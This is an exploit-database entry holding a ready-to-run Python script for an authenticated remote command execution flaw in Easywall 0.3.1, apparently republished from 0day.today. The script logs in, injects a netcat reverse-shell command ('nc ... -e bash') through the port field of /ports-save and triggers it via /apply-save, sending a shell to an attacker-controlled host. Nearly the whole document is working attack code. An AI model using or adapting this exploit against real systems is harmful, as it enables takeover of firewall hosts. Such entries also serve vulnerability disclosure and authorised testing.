@@ -1,0 +1,68 @@
+id: 39408
+date: 03/04/2024
+title: Easywall 0.3.1 - Authenticated Remote Command Execution Exploit
+author: Melvin Mejia
+cves: 
+
+# Exploit Title: Easywall 0.3.1 - Authenticated Remote Command Execution
+# Exploit Author: Melvin Mejia
+# Vendor Homepage: https://jpylypiw.github.io/easywall/
+# Software Link: https://github.com/jpylypiw/easywall
+# Version: 0.3.1
+# Tested on: Ubuntu 22.04
+
+import requests, json, urllib3
+urllib3.disable_warnings()
+
+def exploit():
+    
+    # Replace values needed here
+    target_host = "192.168.1.25"
+    target_port= "12227"
+    lhost = "192.168.1.10"
+    lport = "9001"
+    user = "admin"
+    password = "admin"
+    
+    target = f"https://{target_host}:{target_port}"
+
+    # Authenticate to the app
+    print("[+] Attempting login with the provided credentials...")
+    login_data = {"username":user, "password":password}
+    session = requests.session()
+    try:
+        login = session.post(f'{target}/login',data=login_data,verify=False)
+    except Exception as ex:
+        print("[!] There was a problem connecting to the app, error:", ex)
+        exit(1)
+
+    if login.status_code != 200:
+        print("[!] Login failed.")
+        exit(1)
+    else:
+        print("[+] Login successfull.")    
+    
+    # Send the payload, the port parameter suffers from a command injection vulnerability
+    print("[+] Attempting to send payload.")
+    rev_shell = f'/usr/bin/nc {lhost} {lport} -e bash #'
+    data = {"port":f"123;{rev_shell}", "description":"","tcpudp":"tcp"}
+    send_payload = session.post(f"{target}/ports-save",data=data,verify=False)
+    if send_payload.status_code != 200:
+        print("[!] Failed to send payload.")
+        exit(1)
+    else:
+        print("[+] Payload sent.")
+
+    # Trigger the execution of the payload
+    print("[+] Attempting execution.")
+    data = {"step_1":"", "step_2":""}
+    execute = session.post(f"{target}/apply-save",data=data, verify=False)
+    if execute.status_code != 200:
+        print("[!] Attempt to execute failed.")
+        exit(1)
+    else:
+        print(f"[+] Execution succeded, you should have gotten a shell at {lhost}:{lport}.")
+
+exploit()
+
+#  0day.today [2024-03-06]  #
